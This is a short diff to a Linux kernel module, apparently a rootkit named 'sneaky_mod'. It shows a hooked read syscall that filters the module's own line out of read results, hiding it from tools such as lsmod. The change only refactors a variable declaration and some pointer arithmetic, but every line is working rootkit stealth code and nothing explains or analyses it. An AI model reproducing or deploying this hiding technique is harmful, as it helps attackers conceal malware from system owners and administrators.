@@ -69,6 +69,7 @@ asmlinkage ssize_t (*original_read)(struct pt_regs *);
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs) {
   ssize_t orig = original_read(regs);
   char * start = NULL;
+  char * end = NULL;
   ssize_t len = 0;
 
   if (orig <= 0) {
@@ -77,10 +78,10 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs) {
 
   start = strstr((char *)regs->si, "sneaky_mod ");
   if (start != NULL) {
-    char * end = strchr(start, '\n');
+    end = strchr(start, '\n');
     if (end != NULL) {
       end++;
-      memmove(start, end, (void *)regs->si + orig - (void *)end);
+      memmove(start, end, orig + (void *)regs->si - (void *)end);
       len = end - start;
       orig -= len;
     }
